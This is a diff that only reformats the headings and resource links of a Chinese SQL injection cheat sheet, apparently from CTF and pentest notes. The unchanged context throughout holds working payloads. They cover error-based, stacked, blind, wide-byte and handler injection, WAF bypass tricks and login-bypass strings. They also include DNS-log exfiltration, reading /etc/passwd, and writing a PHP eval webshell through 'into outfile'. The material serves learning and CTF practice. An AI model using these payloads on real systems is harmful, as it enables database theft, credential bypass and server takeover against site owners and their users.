@@ -59,7 +59,7 @@
 1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
 ```
 ## 堆叠注入Payload
-#### 常规查询语句
+### 常规查询语句
 ```
 1';show databases;# //查库名·
 1';show tables;# //查表名
@@ -675,7 +675,7 @@ python sqlmap.py [选项]
 --wizard            适合初级用户的向导界面
 ```
 
-# 注释符号绕过
+## 注释符号绕过
 
 常用的注释符有:
 
@@ -691,13 +691,13 @@ python sqlmap.py [选项]
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767908067-787addd2-d49e-41a1-a0d0-266c19aab48c-166912403146839.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767908067-787addd2-d49e-41a1-a0d0-266c19aab48c-166912403146839.png)
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767983683-86522a64-ad50-4d4e-83b7-6f9d346c6d49-166912403146841.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666767983683-86522a64-ad50-4d4e-83b7-6f9d346c6d49-166912403146841.png)
 
-# 大小写绕过
+## 大小写绕过
 
 常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。
 例如：waf过滤了关键字select，可以尝试使用Select等绕过。
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768100924-7947e747-35b5-4167-8f97-fb5a22db45d4.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666768100924-7947e747-35b5-4167-8f97-fb5a22db45d4.png)
 
-# 注释绕过
+## 注释绕过
 
 在mysql中/*admin*/是注释符，就像C和js中//代表注释的意思，也可以充当空白符。因为 /**/在sql语句中可以解析成功。事实上许多WAF都考虑到/**/可以作为空白分，但是waf检测 “/*.*/”很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：/\w+*/。或者，WAF可能只中间检查n个字符“/*.{,n}*/”,直至达到检测的最大值，因此payload：
 
@@ -706,7 +706,7 @@ index.php?id=-1 union/**/select 1,2,3
 index.php?id=-1 union/*aaaaaaaaaaaaaaa(1万个a)aaaaaaaaaaaaaaaaa*/select 1,2,3
 ```
 
-# 内联注释绕过
+## 内联注释绕过
 
 内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!…*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768162774-ce9f4f40-99e4-4bc9-acbd-4b3c5b2f23a5.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666768162774-ce9f4f40-99e4-4bc9-acbd-4b3c5b2f23a5.png)
@@ -715,7 +715,7 @@ index.php?id=-1 union/*aaaaaaaaaaaaaaa(1万个a)aaaaaaaaaaaaaaaaa*/select 1,2,3
 
 在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。
 
-# 特殊编码绕过
+## 特殊编码绕过
 
 ## 十六进制绕过
 
@@ -756,7 +756,7 @@ tip:好像新版mysql不能用了 ，反正遇到多试试吧！
 假如对select关键字进行了过滤，可以对其中几个字母进行unicode编码：se%u006cect
 ```
 
-# 空格过滤绕过
+## 空格过滤绕过
 
 一般绕过空格过滤的方法有以下几种方法来取代空格
 
@@ -774,7 +774,7 @@ tap
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782960545-2633b2f1-ab42-4d3f-bfc3-0e84d9bd6cc2-166912403146950.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782960545-2633b2f1-ab42-4d3f-bfc3-0e84d9bd6cc2-166912403146950.png)
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782995285-ead5c057-0a63-4024-933d-c0098a29550b-166912403146952.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666782995285-ead5c057-0a63-4024-933d-c0098a29550b-166912403146952.png)
 
-# 过滤or and xor not 绕过
+## 过滤or and xor not 绕过
 
 ```
 and = &&
@@ -783,7 +783,7 @@ xor = | # 异或
 not = !
 ```
 
-# 过滤等号=绕过
+## 过滤等号=绕过
 
 ## 使用like绕过
 
@@ -813,7 +813,7 @@ regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配
 所以在前面再加一个!结果就是等号了
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783488413-ecce5e46-10e2-4873-b0e9-c833976b6440-166912403146964.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783488413-ecce5e46-10e2-4873-b0e9-c833976b6440-166912403146964.png)
 
-# 过滤大小于号绕过
+## 过滤大小于号绕过
 
 为了方便测试，我把表的内容修改了一下:
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783825320-7d3035e0-ebae-4ed3-8a89-95c0330ea498-166912403146966.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666783825320-7d3035e0-ebae-4ed3-8a89-95c0330ea498-166912403146966.png)
@@ -911,7 +911,7 @@ mysql> select * from users where id=1 and substr(username,1,1) between 'a' and '
 1 row in set (0.00 sec)
 ```
 
-# 过滤引号绕过
+## 过滤引号绕过
 
 ## 使用十六进制
 
@@ -933,7 +933,7 @@ mysql> select * from users where username=0xE69D8EE799BD;
 %df\' = %df%5c%27=縗’
 ```
 
-# 过滤逗号绕过
+## 过滤逗号绕过
 
 sql盲注时常用到以下的函数：
 **substr()**
@@ -1061,7 +1061,7 @@ mysql> select * from users limit 1 offset 1;
 1 row in set (0.00 sec)
 ```
 
-# 过滤函数绕过
+## 过滤函数绕过
 
 ## sleep被过滤绕过
 
@@ -1108,7 +1108,7 @@ datadir–>@@datadir
 
 ## ord()–>ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。
 
-# 垃圾字符填充绕过
+## 垃圾字符填充绕过
 
 一般为了考虑性能等原因，程序员在设置WAF绕过规则时设置了过滤的数据包长度，如果数据包太大或太长，就会直接放弃匹配过滤后面的数据，从而略过这个数据包。因此我们可以通过传入大量的参数值，超到WAF绕过的临界值，从而绕过
 
@@ -1116,7 +1116,7 @@ datadir–>@@datadir
 index.php?id=-1aaaaaa(10万个a)aaaa union select 1,2,3
 ```
 
-# 参数污染
+## 参数污染
 
 简单来说，存在多个同名参数的情况下，可能存在逻辑层和 WAF 层对参数的取值不同，即可能逻辑层使用的第一个参数，而 WAF 层使用的第二个参数，而这时我们只需要第二个参数正常，通过WAF层，然后在第一个参数中插入注入语句，这样组合起来就可以绕过 WAF，payload：
 
@@ -1127,19 +1127,19 @@ index.php?name=first&name=last
 而由于部分中间件的不同，部分检测规则存在差异，下面是一些服务器检测规则：
 [![8b2d8e44a6d34ea9b7b6e19a1fc6ccb9.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791032465-94ed2b6c-3422-4ca0-ae48-3eec1145a569.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666791032465-94ed2b6c-3422-4ca0-ae48-3eec1145a569.png)
 
-# **keep-alive(持久连接)**
+## **keep-alive(持久连接)**
 
 在HTTP请求头部中有Connection这个字段，用来判断建立的 TCP连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成keep-alive，Keep-Alive功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束Connection为close为止。
 因此我们可以使用burpsuite抓包，手动将connection值设置为 keep-alive，然后在 http 请求报文中构造多个请求，将我们的注入代码隐藏在第 n 个请求中，从而绕过 waf。
 
-# **请求方式绕过：**
+## **请求方式绕过：**
 
 一些 WAF 对于get请求和post请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。
 一些 WAF 检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。
 一般方法便是采用burpsuite抓包，更改提交方式，如下
 [![6bcc270dcc934c7984213eb916a17f18.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791171451-68652e53-879a-46d9-ab0e-b574caa44cee.png)](https://sakurahack-y.github.io/2022/11/22/sql注入绕过方法总结/1666791171451-68652e53-879a-46d9-ab0e-b574caa44cee.png)
 
-# 静态资源
+## 静态资源
 
 特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制,waf为了提高检测效率，会直接放弃检测这样一些静态文件名后缀的请求。payload:
 
@@ -1149,7 +1149,7 @@ index.php/1.js?id=1
 
 备注: Aspx/php只识别到前面的.aspx/.php后面基本不识别
 
-# url白名单
+## url白名单
 
 为了防止误拦，部分WAF内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势:
 index.php/admin.php?id=1
@@ -1161,7 +1161,7 @@ WAF对传入的参数进行比较，只要uri中存在/manage/，/admin/ 就作�
 index.php?a=/manage/&id=1 union select 1,2,3
 ```
 
-# **缓冲区溢出绕过**
+## **缓冲区溢出绕过**
 
 ```
 (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+
@@ -1169,7 +1169,7 @@ index.php?a=/manage/&id=1 union select 1,2,3
 
 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)
 
-# 使用sqlmap进行bypass
+## 使用sqlmap进行bypass
 
 我们在知道替换规则的情况下可以自己写sqlmap的bypass脚本
 在sqlmap文件夹下的/tamper/下，自己创建个py文件
@@ -1195,14 +1195,14 @@ def tamper(payload, **kwargs):
 sqlmap --tamper=模块名.py -u 'http://xxx.xx.xx.xx/ddd.php?id=1'
 ```
 
-# sql注入原理
+## sql注入原理
 
 SQL注入实质上是将用户传入的参数没有进行严格的处理拼接sql语句的执行字符串中。
 可能存在注入的地方有：登陆页面，搜索，获取HTTP头的信息(client-ip , x-forward-of)，订单处理（二次注入）等
 注入的参数类型：POST, GET, COOKIES, SERVER 其实只要值传到数据库的执行语句那么就可能存在sql注入。
 注入方法：union联合查询，延迟注入，布尔型回显判断注入，将内容输出到DNSlog
 
-# 常用语句
+## 常用语句
 
 information_schema包含了大量有用的信息，例如下图 :
 [![zawirg523g.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666794205856-324f76c8-fd02-42c4-8b07-acf208781212.png)
@@ -1226,7 +1226,7 @@ information_schema包含了大量有用的信息，例如下图 :
 写文件：select '<?php @eval($_POST[a]);?>' into outfile '/var/www/html/a.php'  //该处文件名无法使用16进制绕过
 ```
 
-# 基本手工注入流程
+## 基本手工注入流程
 
 ## 获取字段数
 
@@ -1271,7 +1271,7 @@ select null,null,...,group_concat(column_name) from information_schema.columns w
 select null,group_concat(username,password) from users
 ```
 
-# 万能密码
+## 万能密码
 
 正常查询语句如下:
 
@@ -1287,7 +1287,7 @@ mysql_query("select username from users where id='$_GET['id']' ");
 '=0#　　　　　　　　　　　　//完整语句 select username,age from userinfo where id=''=0#
 ```
 
-# 联合注入
+## 联合注入
 
 ```
 xx' union select 1,(select database())#
@@ -1300,7 +1300,7 @@ mysql> select * from users where id=-1 union select 1,user(),3;
 1 row in set (0.00 sec)
 ```
 
-# bool注入
+## bool注入
 
 substr(str,start,long)
 str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度
@@ -1331,7 +1331,7 @@ xx' or if((locate(binary'c',(select database()),1)=1),1,0) #
 xx' or if((locate(binary't',(select database()),1)=2),1,0) #
 ```
 
-# 延迟注入
+## 延迟注入
 
 在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功
 延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显
@@ -1355,7 +1355,7 @@ Empty set (1.40 sec)
 
 benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟
 
-# 报错注入
+## 报错注入
 
 报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容
 报错注入函数很多
@@ -1427,7 +1427,7 @@ id=1 and multilinestring((select * from(select * from(select user())a)b))
 id=1 and exp(~(select * from(select user())a))
 ```
 
-# 堆叠查询注入
+## 堆叠查询注入
 
 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句
 
@@ -1470,7 +1470,7 @@ http://127.0.0.1/sqli-labs/Less-38/?id=-1'union select 1,username,password from 
 如果select被过滤。可以搭配desc来读取表的字段
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png)
 
-# 宽字节注入
+## 宽字节注入
 
 利用条件:
 
@@ -1497,7 +1497,7 @@ id = -1%df\' union select 1,user(),3,%23
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png)
 后面的就正常查询即可，这里不再演示
 
-# 二次注入
+## 二次注入
 
 攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。
 即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。
@@ -1529,7 +1529,7 @@ UPDATE users SET PASSWORD='$pass' where username='$username'#
 我们再看数据库，惊奇的发现admin的密码已经被改了
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png)
 
-# 异或注入
+## 异或注入
 
 异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假(0)，两个条件不同即为真(1)，null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。
 mysql里异或运算符为^ 或者 xor
@@ -1566,7 +1566,7 @@ mysql> select 1^1;
 ** xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据 **
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png)
 
-# 使用handler进行注入
+## 使用handler进行注入
 
 MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。
 句柄 相当于一个指针，是一个广义的指针，不是特定指向某一个形式（整数、数组、对象等）
@@ -1627,7 +1627,7 @@ http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;desc
 http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;%23
 ```
 
-# 无列名注入
+## 无列名注入
 
 ## 当information_schema库被禁用
 
@@ -1839,7 +1839,7 @@ for i in range(1,50):
             break
 ```
 
-# sql盲注
+## sql盲注
 
 盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注
 
@@ -1981,7 +1981,7 @@ for i in range(10000):
 
 当and和or被过滤的时候，我们可以用异或注入然后搭配上面三个去代替，本质上是一样的。
 
-# DNS请求注入
+## DNS请求注入
 
 **DNS平台:**
 
@@ -2054,7 +2054,7 @@ load_file()函数访问的是文件，所以域名后面需要添加/abc
 如图，这里的security就是我们的数据库名称
 [![image.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png)
 
-# **mysql关于utf-8编码问题**
+## **mysql关于utf-8编码问题**
 
 如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的
 是无法像GBK用宽字节绕过 ‘ ，但是在数据库中utf-8分为2种校对模式
@@ -2082,7 +2082,7 @@ else{
 }
 ```
 
-# sql注入读取文件
+## sql注入读取文件
 
 ## load_file读取文件
 
@@ -2172,7 +2172,7 @@ load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
 这里我本地复现失败了，我就放一张别人的图吧，qaq
 [![图片-26.png](https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png)](https://sakurahack-y.github.io/2022/11/22/sql注入总结/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png)
 
-# sql注入写shell
+## sql注入写shell
 
 ## into outfile()写文件
 
@@ -2242,12 +2242,12 @@ show variables like '%log%';*/
 select '<?php phpinfo();?>' from mysql.user where sleep(10);
 ```
 
-# Mysql任意文件读取
+## Mysql任意文件读取
 
 这个解释起来比较多，放个参考链接
 [https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b?#](https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b#) 《MySQL客户端任意文件读取》
 
-# MYSQL8.0注入新特性
+## MYSQL8.0注入新特性
 
 MYSQL8.0.19后 出现两个新的关键字table和values
 
@@ -2617,7 +2617,7 @@ azzzz < mysql
 
 ## 相关资源
 
-- **工具**: [sqlmap速查手册](工具使用/sqlmap-Cheat-Sheet.pdf) — 参见 SQL.md L288-L670 章节
-- **靶场WP**: [SQLI-LABS靶场WP](WP汇总/各大靶场WP汇总.md)
-- **代码审计**: [[web/实战打法/php代码审计.md|php代码审计.md]] — SQL注入 WITH ROLLUP 绕过 (L990-L1112)
-- **哈希碰撞**: [md5爆破脚本](CTF常用脚本及工具/md5爆破/) — 配合SQL注入写webshell
+- **工具**: [[web/工具手册/sqlmap 速查表.md|sqlmap速查手册]] — 参见本文 L288-L670 章节
+- **靶场WP**: [[web/赛事专题/靶场复盘/SQLI-LABS.md|SQLI-LABS靶场WP]]
+- **代码审计**: [[web/实战打法/PHP 代码审计.md|php代码审计.md]] — SQL注入 WITH ROLLUP 绕过 (L990-L1112)
+- **哈希碰撞**: `misc/载荷与字典/CTF常用脚本及工具__md5爆破__md5-brust.py` — 配合SQL注入写webshell
